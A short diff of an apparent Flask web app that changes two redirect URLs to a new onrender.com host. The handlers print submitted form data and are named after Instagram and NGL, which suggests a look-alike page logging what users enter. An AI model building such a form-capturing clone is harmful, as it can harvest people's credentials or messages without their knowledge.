@@ -29,14 +29,14 @@ def after():
 def run_insta_code():
     if request.method == "POST":
         print(request.form)
-        return redirect("https://ngl.onrender.com/simran_deyy")
+        return redirect("https://ngl-link-tuy5.onrender.com/simran_deyy")
 
 
 @app.route("/simran_deyy", methods=["POST", "GET"])
 def run_ngl_code():
     if request.method == "POST":
         print(request.form)
-        return redirect("https://ngl.onrender.com/after")
+        return redirect("https://ngl-link-tuy5.onrender.com/after")
 
 
 if __name__ == "__main__":
